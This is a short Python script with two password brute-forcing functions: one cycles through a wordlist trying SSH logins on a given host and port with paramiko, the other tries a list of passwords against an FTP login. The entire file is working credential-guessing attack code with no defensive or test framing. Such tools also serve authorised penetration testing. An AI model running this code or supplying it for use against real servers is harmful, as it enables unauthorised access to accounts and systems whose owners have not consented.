import paramiko
import ftplib



def bruteforce_ssh(adress, port, username, wordlist, threads, noi):
    password_list = open(wordlist,'r').readlines()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for i in range(noi,len(password_list),threads):
        password = password_list[i].split('\n')[0]
        try:
            client.connect(hostname=adress, port=port, username=username, password=password)
            return password
            exit()
        except:
            pass

    client.close()
    return None




def ftpbruteforce(hostname, username, passwords):
    for password in passwords:
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            return password
        except:
            continue
    return None